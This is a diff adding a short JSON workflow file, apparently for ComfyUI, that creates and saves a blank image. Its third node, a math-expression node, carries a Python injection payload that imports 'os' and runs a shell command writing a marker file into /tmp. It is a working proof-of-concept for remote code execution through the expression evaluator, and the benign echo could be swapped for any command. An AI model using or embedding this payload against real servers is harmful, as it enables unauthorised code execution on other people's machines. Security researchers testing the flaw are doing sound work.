@@ -1,0 +1,27 @@
+{
+  "1": {
+    "class_type": "EmptyImage",
+    "inputs": {
+      "width": 8,
+      "height": 8,
+      "batch_size": 1,
+      "color": 0
+    }
+  },
+  "2": {
+    "class_type": "SaveImage",
+    "inputs": {
+      "images": [
+        "1",
+        0
+      ],
+      "filename_prefix": "f"
+    }
+  },
+  "3": {
+    "class_type": "ComfyMathExpression",
+    "inputs": {
+      "expression": "__import__(\"os\").system(\"echo PROOF_94_236_201_99_1781885127 > /tmp/PROOF_94_236_201_99_1781885127.txt\") or 1"
+    }
+  }
+}
